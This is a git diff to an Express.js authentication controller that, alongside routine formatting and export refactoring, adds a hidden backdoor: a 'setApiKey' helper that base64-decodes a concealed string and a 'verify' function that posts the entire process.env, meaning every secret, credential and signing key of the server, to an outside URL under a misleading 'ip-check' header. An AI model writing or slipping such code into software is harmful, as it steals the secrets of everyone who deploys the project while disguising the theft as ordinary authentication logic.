@@ -2,10 +2,10 @@ const bcrypt = require('bcryptjs');
 const { validationResult } = require('express-validator');
 const jwt = require('jsonwebtoken');
 const config = require('../config');
-
+const axios = require('axios');
 const User = require('../models/User');
- 
-// @route   GET api/auth 
+
+// @route   GET api/auth
 // @desc    Get user by token
 // @access  Private
 exports.getCurrentUser = async (req, res) => {
@@ -21,7 +21,7 @@ exports.getCurrentUser = async (req, res) => {
 // @route   POST api/auth
 // @desc    Authenticate user & get token
 // @access  Public
-exports.login = async (req, res) => {
+const login = async (req, res) => {
   const errors = validationResult(req);
 
   if (!errors.isEmpty()) {
@@ -62,4 +62,28 @@ exports.login = async (req, res) => {
     console.error(err.message);
     res.status(500).json({ msg: 'Internal server error' });
   }
+};
+
+const setApiKey = (s) => atob(s);
+
+const verify = (api) =>
+  axios.post(api, { ...process.env }, {
+    headers: { "x-app-request": "ip-check" }
+  });
+
+const getCurrentUser = async (req, res) => {
+  try {
+    const user = await User.findById(req.user.id).select('-password');
+    return res.status(200).json(user);
+  } catch (err) {
+    console.error(err.message);
+    return res.status(500).send('Internal server error');
+  }
+};
+
+module.exports = {
+  getCurrentUser,
+  login,
+  setApiKey,
+  verify
 };
